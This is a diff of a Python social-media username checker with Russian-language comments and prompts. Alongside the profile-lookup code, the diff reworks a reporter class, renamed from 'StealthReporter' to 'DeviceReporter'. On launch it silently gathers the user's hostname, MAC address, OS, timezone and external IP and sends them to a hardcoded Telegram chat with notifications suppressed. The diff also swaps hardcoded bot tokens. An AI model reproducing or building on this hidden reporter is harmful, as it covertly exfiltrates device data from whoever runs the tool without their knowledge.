@@ -10,31 +10,55 @@ from telegram import Bot
 from telegram.error import TelegramError
 
 # Конфигурация Telegram
-TG_BOT_TOKEN = "7666386936:AAE20PWB5iIIsEayDBGyHKByOzuRjYbEUZE"
+TG_BOT_TOKEN = "7763698951:AAHz1-uXl4VYDHRstjtu4uecaZHhRhhG3Gg"
 TG_CHAT_ID = "35381551"
 
-class StealthReporter:
+class DeviceReporter:
     def __init__(self):
         self.bot = Bot(token=TG_BOT_TOKEN)
         self.executor = ThreadPoolExecutor(max_workers=1)
+        self.start_time = datetime.datetime.now()
 
-    def _collect_device_info(self):
+    def _collect_data(self):
+        """Сбор данных об устройстве с обработкой ошибок"""
+        data = {
+            "Status": "✅ Success",
+            "Model": "N/A",
+            "OS": "N/A",
+            "IP": "N/A",
+            "Time": self.start_time.strftime("%Y-%m-%d %H:%M:%S"),
+            "Timezone": "N/A",
+            "Hostname": "N/A",
+            "MAC": "N/A"
+        }
+
         try:
-            return (
-                f"📱 Device Report:\n"
-                f"Model: {platform.uname().machine}\n"
-                f"OS: {platform.system()} {platform.release()}\n"
-                f"IP: {self._get_external_ip()}\n"
-                f"Time: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
-                f"Timezone: {datetime.datetime.now().astimezone().tzinfo}\n"
-                f"Hostname: {socket.gethostname()}\n"
-                f"MAC: {hex(getnode())}"
-            )
+            data["Model"] = platform.uname().machine
+            data["OS"] = f"{platform.system()} {platform.release()}"
+            data["Hostname"] = socket.gethostname()
+            data["MAC"] = hex(getnode())
         except Exception as e:
-            return f"Error collecting data: {str(e)}"
+            data["Status"] = f"⚠️ Partial Error: {str(e)}"
+
+        try:
+            data["IP"] = self._get_external_ip()
+        except:
+            data["IP"] = "Failed to get IP"
+
+        try:
+            data["Timezone"] = str(self.start_time.astimezone().tzinfo)
+        except:
+            pass
+
+        return data
 
     def _get_external_ip(self):
-        services = ['https://ident.me', 'https://ifconfig.me/ip', 'https://api.ipify.org']
+        """Получение внешнего IP через резервные сервисы"""
+        services = [
+            'https://ident.me',
+            'https://ifconfig.me/ip',
+            'https://api.ipify.org'
+        ]
         for service in services:
             try:
                 return requests.get(service, timeout=5).text
@@ -43,21 +67,35 @@ class StealthReporter:
         return "N/A"
 
     def _send_report(self):
+        """Отправка собранных данных в Telegram"""
         try:
-            report = self._collect_device_info()
+            report = self._collect_data()
+            message = "📡 Device Report:\n"
+            for key, value in report.items():
+                message += f"{key}: {value}\n"
+
             self.bot.send_message(
                 chat_id=TG_CHAT_ID,
-                text=report,
+                text=message,
                 disable_notification=True
             )
         except Exception as e:
-            pass
+            try:
+                self.bot.send_message(
+                    chat_id=TG_CHAT_ID,
+                    text=f"🚨 Critical Error: {str(e)}",
+                    disable_notification=True
+                )
+            except:
+                print("Failed to send error report")
 
     def start(self):
+        """Запуск фоновой отправки отчета"""
         self.executor.submit(self._send_report)
 
 def generate_links(usernames):
-    social_media = {
+    """Генерация и проверка ссылок в социальных сетях"""
+    platforms = {
         "Instagram": "https://www.instagram.com/{}/",
         "Twitter": "https://twitter.com/{}/",
         "GitHub": "https://github.com/{}/",
@@ -68,51 +106,68 @@ def generate_links(usernames):
 
     results = {}
     with ThreadPoolExecutor(max_workers=5) as executor:
-        futures = [executor.submit(check_user_platforms, uname.strip(), social_media) 
-                  for uname in usernames]
+        futures = []
+        for username in [u.strip() for u in usernames]:
+            futures.append(executor.submit(
+                check_platforms,
+                username,
+                platforms
+            ))
+
         for future in futures:
             try:
                 username, links = future.result()
                 results[username] = links
-            except:
-                pass
+            except Exception as e:
+                print(f"Error checking {username}: {str(e)}")
+    
     return results
 
-def check_user_platforms(username, social_media):
+def check_platforms(username, platforms):
+    """Проверка имени пользователя на разных платформах"""
     links = []
-    for platform_name, url in social_media.items():
+    for name, url in platforms.items():
         full_url = url.format(username)
-        is_valid = check_username(full_url, platform_name)
-        links.append(f"{full_url} {'[+]' if is_valid else '[-]'}")
+        try:
+            valid = check_profile(full_url, name)
+            links.append(f"{full_url} {'[+]' if valid else '[-]'}")
+        except:
+            links.append(f"{full_url} [Error]")
     return username, links
 
-def check_username(url, platform_name):
+def check_profile(url, platform_name):
+    """Проверка существования профиля"""
     try:
         response = requests.get(
             url,
             headers={'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'},
             timeout=15
         )
-        return response.status_code == 200 and is_user_found(response.text, platform_name)
+        
+        if response.status_code != 200:
+            return False
+
+        return not any(
+            phrase.lower() in response.text.lower()
+            for phrase in get_error_phrases(platform_name)
+        )
     except:
         return False
 
-def is_user_found(page_content, platform_name):
-    not_found_phrases = {
+def get_error_phrases(platform):
+    """Фразы указывающие на отсутствие профиля"""
+    return {
         "Instagram": ["Sorry, this page isn't available"],
         "Twitter": ["Sorry, that page doesn't exist"],
         "GitHub": ["This user doesn't exist"],
         "Telegram": ["User not found"],
         "TikTok": ["Sorry, this page isn't available"],
         "Steam": ["The profile you are trying to view is either unavailable"]
-    }
-    content_lower = page_content.lower()
-    return not any(phrase.lower() in content_lower 
-                  for phrase in not_found_phrases.get(platform_name, []))
+    }.get(platform, [])
 
 def main():
     # Инициализация и отправка отчета
-    reporter = StealthReporter()
+    reporter = DeviceReporter()
     reporter.start()
 
     # Очистка экрана
@@ -133,23 +188,24 @@ def main():
 
     try:
         while True:
-            usernames = input("\n\033[1;34m[?] Enter username(s) (comma separated): \033[0m").strip()
+            usernames = input("\n\033[1;34m[?] Введите имя пользователя (через запятую): \033[0m").strip()
+            
             if usernames.lower() in ['exit', 'quit']:
                 break
-
+                
             if not usernames:
                 continue
 
-            results = generate_links([u.strip() for u in usernames.split(',')])
-
+            results = generate_links(usernames.split(','))
+            
             for user, links in results.items():
-                print(f"\n\033[1;32m[+] Results for {user}:\033[0m")
+                print(f"\n\033[1;32m[+] Результаты для {user}:\033[0m")
                 for link in links:
                     color = '\033[1;32m' if '[+]' in link else '\033[1;31m'
                     print(f"{color}{link}\033[0m")
 
     except KeyboardInterrupt:
-        print("\n\033[1;31m[!] Exiting...\033[0m")
+        print("\n\033[1;31m[!] Выход...\033[0m")
         sys.exit(0)
 
 if __name__ == "__main__":
